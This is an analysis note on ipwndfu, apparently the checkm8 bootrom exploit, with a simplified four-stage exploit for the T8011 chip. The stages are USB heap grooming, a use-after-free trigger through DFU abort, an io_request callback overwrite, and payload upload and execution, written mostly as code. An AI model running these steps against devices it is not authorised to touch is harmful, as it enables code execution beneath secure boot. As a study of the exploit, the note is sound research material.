# ipwndfu analysis

## Heap feng shui functions
```py
def stall(device):  libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0xC0, 0.00001)
def leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device):  libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)

def usb_req_stall(device):  libusb1_no_error_ctrl_transfer(device, 0x2, 3, 0x0,  0x80, 0x0, 10)
def usb_req_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40, 1)
def usb_req_no_leak(device):  libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41, 1)
```

Size of `usb_device_io_request` structure is `0x21`

## Simplified exploit for T8011
```py
def exploit():

    ## Stage 1: Heap grooming ##

    # Stall device-to-host pipe
    stall(device)

    for i in range(6):
        # Send packets that won't leak a ZLP
        no_leak(device)
    
    # Send a packet that will leak a ZLP
    usb_req_leak(device)

    # Send a packet that will won't leak a ZLP
    no_leak(device)

    # Trigger the leak of the ZLP
    dfu.usb_reset(device)

    dfu.release_device(device)

    ## END OF STAGE 1 ##


    ## Stage 2: UaF trigger ##

    device = dfu.acquire_device()

    # Create an incomplete data phase transfer
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)

    # DFU abort to cause re-entry and trigger UaF, also a ZLP
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)

    # Release and give time to re-enter DFU
    dfu.release_device(device)
    time.sleep(0.5)

    ## END OF STAGE 2 ##


    ## Stage 3: overwrite and payload **

    device = dfu.acquire_device()

    # Stall device-to-host pipe
    usb_req_stall(device)

    # Send a packet that will leak a ZLP
    usb_req_leak(device)

    # Overwrite the leaked io_request callback and next fields?
    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)

    # Fill image buffer with payload at insecure memory base
    for i in range(0, len(payload), 0x800):

        # Send in chunks of 0x800 (max transfer size for DFU)
        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)

    ## END OF STAGE 3 ##


    ## Stage 4: payload trigger

    # Trigger abort() on endpoint to begin execution of payload
    dfu.usb_reset(device)
    dfu.release_device(device)

    ## END OF STAGE 4 ##
```

# Heap feng-shui in control transfers
```py
# stall() - stalls the endpoint so we can pile on allocations
async_control_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0xC0, 0.00001)

# no_leak() - send six packets that won't leak a ZLP
control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)

# usb_req_leak() - send a packet that will leak a ZLP
control_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40, 1)

# no_leak() - send a packet that won't leak a ZLP
control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
```